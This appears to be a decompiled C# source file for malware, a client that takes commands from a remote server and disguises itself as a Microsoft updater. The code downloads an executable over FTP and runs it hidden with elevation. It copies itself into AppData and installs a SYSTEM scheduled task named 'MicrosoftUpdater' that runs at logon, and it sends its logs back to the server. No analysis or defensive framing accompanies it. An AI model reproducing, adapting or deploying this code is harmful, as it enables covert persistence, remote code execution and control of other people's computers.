using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace ClientWorker
{
	// Token: 0x02000004 RID: 4
	public class Functions
	{
		// Token: 0x0600000D RID: 13 RVA: 0x00002711 File Offset: 0x00000911
		public void Start()
		{
			this.ftpClient.Init();
		}

		// Token: 0x0600000E RID: 14 RVA: 0x00002720 File Offset: 0x00000920
		public void GetUpdater()
		{
			Log.Send("GetUpdater()");
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			try
			{
				this.KillUpdater();
				this.ftpClient.FTPDownloadFile(StartData.updater, folderPath + StartData.floaderNewCopy);
				new Process
				{
					StartInfo = 
					{
						FileName = folderPath + StartData.floaderNewCopy + StartData.updater,
						WindowStyle = ProcessWindowStyle.Hidden,
						Verb = "runas",
						Arguments = Program.nameProcess
					}
				}.Start();
			}
			catch (Exception ex)
			{
				Log.Send("The start process failed: " + ex.ToString());
			}
		}

		// Token: 0x0600000F RID: 15 RVA: 0x000027EC File Offset: 0x000009EC
		private void KillUpdater()
		{
			foreach (Process process in Process.GetProcessesByName("Updater"))
			{
				process.Kill();
			}
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			File.Delete(folderPath + StartData.floaderNewCopy + StartData.updater);
		}

		// Token: 0x06000010 RID: 16 RVA: 0x00002840 File Offset: 0x00000A40
		public void AnalysisAnswer(string answer)
		{
			if (!(answer == "DownloadUpdater"))
			{
				if ((answer == null || answer.Length != 0) && !(answer == "Reconnect"))
				{
					if (!(answer == "GetLogList"))
					{
						Log.Send("UnknownCommand" + answer);
					}
					else
					{
						this.SendLogList();
					}
				}
				else
				{
					this.Reconnect();
					Log.Send("Reconnect()");
				}
			}
			else
			{
				this.GetUpdater();
				Log.Send("GetUpdater()");
			}
		}

		// Token: 0x06000011 RID: 17 RVA: 0x000028C8 File Offset: 0x00000AC8
		public void Reconnect()
		{
			Log.Send("Reconnect()");
			try
			{
				Program.client.Clear();
				Program.clientThread.Abort();
			}
			catch
			{
			}
			Program.clientThread = new Thread(new ThreadStart(Program.client.Start));
			Program.clientThread.Start();
		}

		// Token: 0x06000012 RID: 18 RVA: 0x00002938 File Offset: 0x00000B38
		private void SendLogList()
		{
			Log.Send("SendLogList()");
			NetworkStream stream = Program.client.stream;
			byte[] bytes;
			foreach (string s in Log.messages)
			{
				bytes = Encoding.Unicode.GetBytes(s);
				stream.Write(bytes, 0, bytes.Length);
			}
			bytes = Encoding.Unicode.GetBytes("EndLog");
			stream.Write(bytes, 0, bytes.Length);
		}

		// Token: 0x06000013 RID: 19 RVA: 0x000029D4 File Offset: 0x00000BD4
		public static void Registration()
		{
			Log.Send("Registration()");
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			Functions.CreateTask();
			Functions.Proliferation(folderPath);
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00002A04 File Offset: 0x00000C04
		public static void Proliferation(string parth)
		{
			Log.Send("Proliferation()");
			parth += StartData.floaderNewCopy;
			string executablePath = Application.ExecutablePath;
			try
			{
				bool flag = File.Exists(parth + StartData.service);
				if (!flag)
				{
					DirectoryInfo directoryInfo = Directory.CreateDirectory(parth);
					File.Copy(executablePath, parth + StartData.service);
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00002A7C File Offset: 0x00000C7C
		public static void CreateTask()
		{
			new Process
			{
				StartInfo = 
				{
					FileName = "cmd.exe",
					Verb = "runas",
					Arguments = "/C SCHTASKS /Create /RU SYSTEM /SC ONLOGON /TN MicrosoftUpdater /TR C:\\Users\\Fox\\AppData\\Roaming\\MicrosoftUpdater\\" + StartData.service,
					WindowStyle = ProcessWindowStyle.Hidden
				}
			}.Start();
			Log.Send("Задача создана");
		}

		// Token: 0x04000009 RID: 9
		private FtpClient ftpClient = new FtpClient();
	}
}
